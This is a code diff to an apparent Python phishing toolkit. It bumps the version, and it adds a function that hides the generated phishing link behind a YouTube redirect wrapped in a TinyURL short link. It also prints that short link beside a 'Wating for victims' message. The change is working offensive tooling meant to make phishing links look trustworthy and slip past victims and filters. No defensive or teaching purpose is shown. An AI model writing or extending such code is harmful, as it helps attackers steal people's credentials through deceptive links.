@@ -60,7 +60,7 @@ Y = Style.BRIGHT+Fore.YELLOW
 M = Style.BRIGHT+Fore.MAGENTA
 W = Style.BRIGHT+Fore.WHITE
 R = Style.BRIGHT+Fore.RED
-version = 1.0
+version = 2.0
 def check_d():
 
     php = os.system("command -v  php > /dev/null")
@@ -164,7 +164,11 @@ else:
 	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
 	filetor.close()
 	pass
-
+import urllib
+def short(link):
+	url =f'http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbmxDbzZTMTZ2WlJLZVBlTlNGbHVBNk1SZzI3UXxBQ3Jtc0trSkRmX1o4NmNYVTdIdFR3LVlQWE5LbmM2YlJPRTRGLTdvdkt6MlR3LWxSNzMwLTVQQ3pVU0JhdTRZNnRidHlvSmVtNHIyY1paYmE2MzJ3QV9UYllLdi1EcXlDVGYyY3hNVHZZOEVubnFVWUVZYUJMdw&q={(link)}'
+	a = requests.get(url)
+	return a.text
 import colorama
 from colorama import Fore , Style
 P = colorama.Fore.LIGHTMAGENTA_EX
@@ -257,7 +261,8 @@ def phish(template):
 	link = startServicea(template+"/",port)
 	print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
 	print(f"\n{G} LINK = {Y} {link}")
-	print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
+	print(f"\n{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
+	print(f"\n{G} SHORT LINK = {Y} {short(link)}")
 	print()
 	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
 	def check(file):
